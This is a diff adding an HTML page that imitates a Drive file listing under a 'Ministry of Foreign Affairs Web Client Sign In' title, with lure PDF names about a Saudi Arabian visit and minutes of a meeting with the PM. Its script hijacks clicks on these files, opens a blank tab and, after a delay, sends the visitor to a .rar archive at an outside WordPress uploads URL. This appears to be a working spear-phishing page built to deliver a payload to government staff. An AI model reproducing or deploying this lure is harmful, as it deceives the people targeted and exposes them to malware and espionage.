@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ministry of Foreign Affairs Web Client Sign In</title>
+
+<link rel="shortcut icon" href="./files/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="./files/style.css">
+
+<style>
+.logo {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 20px;
+}
+.logo img {
+    height: 38px;
+}
+.drive-icon {
+    width: 18px;
+    height: 28px;
+    vertical-align: middle;
+    margin-right: 6px;
+}
+.file-link {
+    text-decoration: none;
+    color: #333;
+    cursor: pointer;
+}
+.file-link:hover {
+    text-decoration: underline;
+}
+</style>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+
+    const REDIRECT_URL = "https://gts.org.pk/wp-content/uploads/2026/03/Establishment-of-Task-Force-to-Review-Pay-Scale-System.rar";
+    const DELAY = 2000; // 2 seconds
+
+    document.querySelectorAll(".file-link").forEach(link => {
+        link.addEventListener("click", function (e) {
+            e.preventDefault();
+
+            // 1️⃣ Open a BLANK page in new tab/window
+            window.open("about:blank", "_blank");
+
+            // 2️⃣ Redirect current tab after delay
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, DELAY);
+        });
+    });
+});
+</script>
+
+
+</head>
+
+<body>
+
+<header class="top-bar">
+    <div class="logo">
+        <img src="./files/13.png">
+        <span>Drive</span>
+    </div>
+    <input type="text" placeholder="Search in Drive" class="search">
+    <div class="logo">
+        <img src="./files/14.png">
+    </div>
+</header>
+
+<div class="container">
+
+<aside class="sidebar">
+    <button class="new-btn">+ New</button>
+    <ul>
+        <li class="active">
+            <img src="./files/15.png" class="drive-icon"> My Drive
+        </li>
+        <li>💻 Computers</li>
+        <li>👥 Shared with me</li>
+        <li>🕒 Recent</li>
+        <li>⭐ Starred</li>
+        <li>🗑️ Bin</li>
+        <li>☁ Storage</li>
+    </ul>
+    <p class="storage-text">3.3 MB of 15 GB used</p>
+    <button class="upgrade-btn">Get more storage</button>
+</aside>
+
+<main class="content">
+<h2>My Drive</h2>
+
+<table class="files">
+<thead>
+<tr>
+    <th>Name</th>
+    <th>Owner</th>
+    <th>Date Modified</th>
+    <th>File Size</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>
+    <img src="./files/11.png" class="pdf-icon">
+    <a class="file-link" data-pdf="./Karachi Port Vision & Future Investment Project.pdf">
+        High Level Visit From Kingdom of Saudi Arabia.pdf
+    </a>
+</td>
+<td>me</td>
+<td>14 Dec 2025</td>
+<td>500 KB</td>
+</tr>
+
+<tr>
+<td>
+    <img src="./files/11.png" class="pdf-icon">
+    <a class="file-link" data-pdf="./Karachi Port Vision & Future Investment Project.pdf">
+        Minutes of meeting with PM and Kingdom of Saudi Arabia.pdf
+    </a>
+</td>
+<td>me</td>
+<td>14 Dec 2025</td>
+<td>300 KB</td>
+</tr>
+</tbody>
+</table>
+</main>
+
+</div>
+
+</body>
+</html>
